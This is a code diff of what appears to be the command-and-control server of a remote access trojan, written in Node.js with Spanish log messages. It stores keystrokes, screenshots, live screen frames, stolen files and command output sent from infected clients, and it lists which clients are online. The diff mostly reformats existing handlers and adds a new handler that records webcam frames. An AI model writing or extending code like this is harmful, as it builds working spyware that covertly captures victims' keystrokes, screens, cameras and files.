@@ -72,50 +72,43 @@ wss.on('connection', (ws, req) => {
           [clientId],
           (err, row) => {
             if (row) {
-              db.run(
-                `UPDATE commands SET result = ?, status = 'done' WHERE id = ?`,
-                [data.result, row.id]
-              );
+              db.run(`UPDATE commands SET result = ?, status = 'done' WHERE id = ?`, [data.result, row.id]);
               console.log(`[+] Resultado guardado para comando ${row.id}`);
             } else {
-              db.run(
-                `INSERT INTO commands (clientId, command, params, result, status, timestamp) VALUES (?, ?, ?, ?, 'done', ?)`,
-                [clientId, 'unknown', '', data.result, Date.now()]
-              );
+              db.run(`INSERT INTO commands (clientId, command, params, result, status, timestamp) VALUES (?, ?, ?, ?, 'done', ?)`,
+                [clientId, 'unknown', '', data.result, Date.now()]);
             }
           }
         );
       }
 
       if (data.type === 'screenshot_result') {
-        db.run(
-          `INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'screenshot', ?, 'done', ?)`,
-          [clientId, JSON.stringify({ image: data.image }), Date.now()]
-        );
+        db.run(`INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'screenshot', ?, 'done', ?)`,
+          [clientId, JSON.stringify({ image: data.image }), Date.now()]);
         console.log(`[+] Screenshot guardado para ${clientId}`);
       }
 
       if (data.type === 'stream_frame') {
-        db.run(
-          `INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'stream', ?, 'done', ?)`,
-          [clientId, JSON.stringify({ image: data.image }), Date.now()]
-        );
+        db.run(`INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'stream', ?, 'done', ?)`,
+          [clientId, JSON.stringify({ image: data.image }), Date.now()]);
         console.log(`[+] Stream frame recibido de ${clientId}`);
       }
 
+      if (data.type === 'camera_frame') {
+        db.run(`INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'camera', ?, 'done', ?)`,
+          [clientId, JSON.stringify({ image: data.image }), Date.now()]);
+        console.log(`[+] Cámara frame recibido de ${clientId}`);
+      }
+
       if (data.type === 'keylog') {
-        db.run(
-          `INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'keylog', ?, 'done', ?)`,
-          [clientId, data.text, Date.now()]
-        );
+        db.run(`INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'keylog', ?, 'done', ?)`,
+          [clientId, data.text, Date.now()]);
         console.log(`[+] Keylog de ${clientId}: ${data.text.substring(0, 50)}...`);
       }
 
       if (data.type === 'file_download') {
-        db.run(
-          `INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'files', ?, 'done', ?)`,
-          [clientId, JSON.stringify({ filename: data.filename, data: data.data, size: data.size }), Date.now()]
-        );
+        db.run(`INSERT INTO commands (clientId, command, result, status, timestamp) VALUES (?, 'files', ?, 'done', ?)`,
+          [clientId, JSON.stringify({ filename: data.filename, data: data.data, size: data.size }), Date.now()]);
         console.log(`[+] Archivo ${data.filename} recibido (${data.size} bytes)`);
       }
 
@@ -139,10 +132,7 @@ wss.on('connection', (ws, req) => {
 app.get('/api/clients', (req, res) => {
   db.all('SELECT * FROM clients ORDER BY lastSeen DESC', (err, rows) => {
     if (err) return res.status(500).json({ error: err.message });
-    const result = rows.map(c => ({
-      ...c,
-      online: activeClients.has(c.id)
-    }));
+    const result = rows.map(c => ({ ...c, online: activeClients.has(c.id) }));
     res.json(result);
   });
 });
